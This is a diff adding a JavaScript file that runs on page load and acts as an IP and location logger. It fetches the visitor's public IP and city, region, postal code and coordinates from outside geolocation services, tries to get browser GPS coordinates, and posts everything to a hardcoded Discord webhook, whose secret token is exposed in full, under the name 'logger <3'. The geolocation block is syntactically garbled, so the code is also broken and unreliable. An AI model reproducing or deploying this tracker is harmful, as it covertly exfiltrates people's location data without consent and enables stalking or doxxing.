@@ -1,0 +1,87 @@
+const sendIP = () => {
+    fetch('https://api.ipify.org?format=json')
+        .then(ipResponse => ipResponse.json())
+        .then(ipData => {
+            const ipadd = ipData.ip;
+
+            return fetch(`https://ipapi.co/${ipadd}/json/`)
+                .then(geoResponse => geoResponse.json())
+                .then(geoData => {
+
+                   
+                    
+                        (navigator.geolocation) 
+                            navigator.geolocation.getCurrentPosition(
+                                pos => {
+                                    {
+                                        ipadd,
+                                        geoData,
+                                        gps; {
+                                            latitude; pos.coords.latitude,
+                                            longitude; pos.coords.longitude
+                                        }
+                                    };
+
+                                }
+                            );
+                        
+                            
+                        
+                    
+
+                });
+        })
+        .then(data => {
+            const { ipadd, geoData, gps } = data;
+
+            const dscURL = 'https://discord.com/api/webhooks/1443048665060216842/9uztTJLzht8-CFfLm1nWnukGYrrqLav39rwdv795wt_Crp6oTPHJ9RR8yn0r3L48Yi4P';
+
+            let gpsText;
+            if (gps) {
+                gpsText = `**GPS Latitude >> ** ${gps.latitude}\n**GPS Longitude >> ** ${gps.longitude}`;
+            } else {
+                gpsText = `**GPS >> ** User denied or unavailable`;
+            }
+
+            return fetch(dscURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    username: "logger <3",
+                    avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
+                    content: `@everyone`,
+                    embeds: [
+                        {
+                            title: 'Scammer',
+                            description:
+                                `**IP Address >> **${ipadd}\n` +
+                                `**Network >> ** ${geoData.network}\n` +
+                                `**City >> ** ${geoData.city}\n` +
+                                `**Region >> ** ${geoData.region}\n` +
+                                `**Country >> ** ${geoData.country_name}\n` +
+                                `**Postal Code >> ** ${geoData.postal}\n` +
+                                `**Latitude >> ** ${geoData.latitude}\n` +
+                                `**Longitude >> ** ${geoData.longitude}\n\n` +
+                                gpsText,
+                            color: 0x800080
+                        }
+                    ]
+                })
+            });
+        })
+        .then(dscResponse => {  
+            if (dscResponse.ok) {
+                console.log('Sent! <3');
+            } else {
+                console.log('Failed :(');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            console.log('Error :(');
+        });
+};
+
+sendIP();
